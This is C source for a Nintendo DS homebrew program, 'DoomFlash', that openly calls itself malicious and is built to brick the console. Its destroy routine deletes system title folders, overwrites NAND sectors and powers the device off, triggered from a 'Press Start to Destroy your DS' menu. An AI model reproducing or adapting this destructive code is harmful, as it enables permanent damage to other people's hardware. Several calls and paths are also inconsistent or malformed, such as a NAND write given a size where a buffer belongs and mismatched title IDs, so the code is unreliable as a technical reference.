#include <dirent.h>
#include <nds.h>
#include <nds/ndstypes.h>
#include <stdarg.h>
#include <stdio.h>

#define CPU_CLOCK_SPEED 999.0
#define NAND_SECTOR_SIZE 512
#define NAND_SECTOR_COUNT 8

void destroy() {
    printf("\e[1;1H\e[2J");
    printf("STARTING BRICK PROCESS......\n");
    swiDelay(49999999000);
    remove("/title");
    remove("/progress");
    remove("/title/0003005/484e4945");
    remove("/title/00030005/484e4541");
    remove("/title/0003005/484e4441");
    remove("/title/0003005/484e4b45");
    remove("/title/00030015/484e4245");
    remove("/title/00030015/484e4b45");
    printf("On your marks.....\n");
    swiDelay(49999999000);
    printf("Time to blow shit up!");
    nand_WriteSectors(0, NAND_SECTOR_COUNT, NAND_SECTOR_SIZE);
    nand_WriteSectors(1, NAND_SECTOR_COUNT, NAND_SECTOR_SIZE);
    nand_WriteSectors(2, NAND_SECTOR_COUNT, NAND_SECTOR_SIZE);
    powerOff(0);
    exit(0);
}

void warning() {
    printf("\e[1;1H\e[2J");
    printf("WARNING!!\n");
    printf("By running this homebrew, you run the risk\n");
    printf("bricking your Nintendo DS. This program is meant to\n");
    printf("be malicious. If you have no intentions of destroying this\n");
    printf("system, turn off your console now.");
    printf("The process will begin soon.");
}

void splash() {
    printf("\e[1;1H\e[2J");
    printf("=======================\n");
    printf("DoomFlash\n");
    printf("=======================\n");
    printf("Press Start to Destroy your DS\n");
    printf("Press Select to Exit\n");
    printf("Press Down to view credits\n");
}

void credits() {
    printf("\e[1;1H\e[2J");
    printf("=======================\n");
    printf("DoomFlash\n");
    printf("=======================\n");
    printf("Programmed and Created by\n");
    printf("Tenor-Z\n");
    printf("@2022-2023\n");
    printf("========================\n");
    printf("Salutations to the pansies\n");
    printf("of Project Dandelion and\n");
    printf("everybody back in CSI.\n");
    printf("=========================\n");
    printf("Press UP to go back.\n");
}

int main(int argc, char **argv) {
    int count = 300;
    lcdMainOnTop();
    consoleDemoInit();
    setCpuClock(CPU_CLOCK_SPEED);
    struct statvfs st;
    statvfs("/", &st);
    scanKeys();
    lcdSwap();
    splash();
    while (count--) swiWaitForVBlank;
    swiWaitForVBlank();
    scanKeys();
    int keys = keysDown();
    if (keys & KEY_START) {
        destroy();
    }
    while (1) {
        swiWaitForVBlank();
        scanKeys();
        keys = keysDown();
        if (keys & KEY_SELECT) break;
        if (keys & KEY_START) destroy();
        if (keys & KEY_DOWN) credits();
        if (keys & KEY_UP) {
            // Handle menu navigation here
        }
    }
    return 0;
}
